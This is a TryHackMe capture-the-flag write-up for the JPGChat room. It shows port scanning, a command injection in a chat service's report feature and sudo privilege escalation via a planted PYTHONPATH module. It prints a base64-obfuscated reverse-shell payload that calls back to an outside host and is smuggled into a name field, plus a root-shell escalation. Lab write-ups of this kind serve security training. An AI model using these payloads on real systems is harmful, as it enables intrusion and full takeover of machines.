---
title: "JPGChat"
date: 2025-03-12
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF JPGChat
categories: [TryHackMe, Easy]
tags: [linux, python]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>JPGChat</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Exploiting poorly made custom chatting service written in a certain language...</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/jpgchat">https://tryhackme.com/room/jpgchat</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge JPGChat.

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.77.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 04:51 EDT
Nmap scan report for 10.10.77.133
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 29.32 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,3000 10.10.77.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 04:52 EDT
Nmap scan report for 10.10.77.133
Host is up (0.038s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.49 seconds
```
From here I proceeded the analysis by port 3000.

## Port 3000 Analysis

```bash
$ nc 10.10.77.133 3000           
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

A quick search revealed the <a href="https://github.com/Mozzie-jpg/JPChat">GitHub</a> repository, along with the source code. The most important part is the report functionality. In that section, I had control over a variable that is included in a command. The command is then executed by Bash. Before testing on the server, I created a small proof of concept:
```python
import os
report_text = test;whoami; echo test"
os.system("bash -c 'echo %s >> /home/kali/Desktop/report.txt'" % report_text)
```
The payload worked, and I got the output as expected:
```bash
$ python3 test.py
  test
	kali
```

Using the `;` I was able to expand the logic and break out. Since I was able to execute arbitrary commands on the system, I managed to gain a reverse shell using the predefined Penelope payloads:
```bash
$ nc 10.10.77.133 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
test;echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvOTAwMSAwPiYxICYK|base64 -d|bash; echo test
your report:
test
```

With this initial access, I was able to successfully retrieve the user flag:
```bash
wes@ubuntu-xenial:~$ cd /home/wes
wes@ubuntu-xenial:~$ cat user.txt
	JPC{[remove]}
```

## Privilege Escalation vagrant

I continued by running `sudo -l` and received the following output:
```bash
wes@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

The script that is executed with root privileges imports `compare`. Furthermore, the `PYTHONPATH` environment variable wasn't set, allowing me to manipulate the location where Python looks for imports:
```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

For an initial proof of concept, I searched for a directory where I had write permissions and set the `PYTHONPATH` to that location:
```bash
wes@ubuntu-xenial:~$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
	[...]
	/home/wes
  [...]
wes@ubuntu-xenial:~$ export PYTHONPATH=/home/wes
```

I created a script called `compare.py`, added a print statement, and made it executable. When I ran `test_module.py` with sudo, my own `compare.py` was executed:
```bash
wes@ubuntu-xenial:~$ echo "print(1)" > compare.py
wes@ubuntu-xenial:~$ chmod +x compare.py 
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
1
Traceback (most recent call last):
  File "/opt/development/test_module.py", line 5, in <module>
    print(compare.Str('hello', 'hello', 'hello'))
NameError: name 'compare' is not defined
```

Great! Since I aimed to gain root privileges, I modified `compare.py` to spawn a Bash shell. After running the main script again, I was able to retrieve the root flag:
```bash
wes@ubuntu-xenial:~$ echo "import pty;pty.spawn('bash')" > compare.py
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:~# whoami
root
root@ubuntu-xenial:~# cat /root/root.txt 
JPC{[remove]}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
```

solved! :)
